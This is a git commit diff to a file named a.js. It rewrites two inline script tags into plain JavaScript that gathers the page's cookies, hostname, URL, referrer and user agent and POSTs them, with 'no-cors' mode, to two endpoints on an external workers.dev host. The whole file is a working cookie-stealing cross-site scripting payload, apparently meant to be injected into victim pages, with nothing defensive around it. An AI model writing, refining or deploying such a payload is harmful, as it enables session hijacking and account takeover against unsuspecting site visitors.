ff587e2f815fc30e5dee43c52109aa2b048b8588
Matteo Elias Schapira <54103711+Niccolo10@users.noreply.github.com>
2026-01-14 19:00:17 +0100

    Update a.js

--- a.js
+++ a.js
@@ -1,2 +1,23 @@
-<script>fetch('https://aged-cloud-b431.0days.workers.dev/x/8c12613f5acfd286-qpkh68e3x',{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cookie:document.cookie,domain:location.hostname,url:location.href,ref:document.referrer,ua:navigator.userAgent})})</script>
-<script>fetch('https://aged-cloud-b431.0days.workers.dev/w/8c12613f5acfd286-a3qwxqcq5',{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({domain:location.hostname,url:location.href,ref:document.referrer,ua:navigator.userAgent,cookie:document.cookie})})</script>
+var data = {
+    cookie: document.cookie,
+    domain: location.hostname,
+    url: location.href,
+    ref: document.referrer,
+    ua: navigator.userAgent
+};
+
+// Send to your first endpoint
+fetch('https://aged-cloud-b431.0days.workers.dev/x/8c12613f5acfd286-qpkh68e3x', {
+    method: "POST",
+    mode: "no-cors",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(data)
+});
+
+// Send to your second endpoint (if you want both)
+fetch('https://aged-cloud-b431.0days.workers.dev/w/8c12613f5acfd286-a3qwxqcq5', {
+    method: "POST",
+    mode: "no-cors",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(data)
+});
